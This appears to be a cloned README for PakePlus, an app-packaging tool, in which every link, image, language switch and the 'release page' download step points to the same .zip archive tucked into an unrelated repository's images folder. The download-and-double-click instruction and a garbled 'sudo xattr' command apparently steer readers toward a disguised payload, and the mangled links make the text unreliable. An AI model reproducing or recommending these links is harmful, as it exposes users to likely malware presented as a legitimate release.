<h4 align="right"> 
<span href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip">English</span> 
<a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" 
style="margin: 0 10px;" >简体中文</a> 
<a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip">日本语</a>
</h4>  
<p align="center">
    <img src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width=138/>
</p>  
...
<div align="left">PakePlus supports Mac, Windows, and Linux, and support Android and iOS. There’s no need to install complex dependencies locally— all you need is a Github Token. Plus, PakePlus is only about 5MB in size. For the latest version, please see the <a href="[#popular-packages](https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip)">release page</a>. or visit: <a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" target="_blank">PakePlus Web</a>. Check the README for information on <a href="#popular-packages">popular packages</a> and <a href="#development">custom development</a>. Feel free to share your suggestions in the <a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip">discussion area</a>.</div>

https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip
...
<table style="border-collapse: collapse; width: 100%; border: 1px solid #ddd;">
    <tr>
        <td align="center" style="border: 1px solid #ddd; padding: 20px;">
            <img style="border-radius: 1.5rem" src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width="100"/>
            <h3 style="margin: 0"><a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" target="_blank">FineVoice</a></h3>
            <p style="margin: 0">Create Every Voice You Imagine</p>
        </td>
        <td align="center" style="border: 1px solid #ddd; padding: 20px;">
            <img style="border-radius: 1.5rem" src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width="100"/>
            <h3 style="margin: 0"><a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" target="_blank">Tauri</a></h3>
            <p style="margin: 0">Create cross-platform applications</p>
        </td>
        <td align="center" style="border: 1px solid #ddd; padding: 20px;">
            <img style="border-radius: 1.5rem" src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width="100"/>
            <h3 style="margin: 0"><a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" target="_blank">Cursor</a></h3>
            <p style="margin: 0">Cursor is the best way to code with AI.</p>
        </td>
        <td align="center" style="border: 1px solid #ddd; padding: 20px;">
            <img style="border-radius: 1.5rem" src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width="100"/>
            <h3 style="margin: 0"><a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" target="_blank">JetBrains</a></h3>
...
-   🍀 Supports static file packaging — drop in a compiled dist folder or https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip from Vue/React to create a client app.
...
1. Download the app from the release page：https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip,  
   double-click to install, and run the app. or visit web: <a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" target="_blank">PakePlus Web</a>

2. Configure a Github Token, create a new project, and set up the configurations. get token guide:  
   <a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip">English</a> <a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" style="margin: 0 50px;">简体中文</a><a href="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip">日本语</a>
...
```sh
sudo xattr -r -d https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip
```
...
1. wechat and group，my wechat is lanxingme，welcome to join the wechat group.
 <p align="center" style="display:flex; justify-content: flex-start;" >
    <img src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width=200/>
    <img src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width=200/>
    <img src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width=200/>
 </p>
...
2. 💖If PakePlus has brought joy to your life, feel free to support it.
 <p align="center" style="display:flex; justify-content: flex-start;">
    <img src="https://raw.githubusercontent.com/migmi111/PakePlus-Android-v2.1.7/main/packages/fuap/assets/templates/custom/images/Plus-Android-Pake-v-v3.6.zip" width=620/>
 </p>
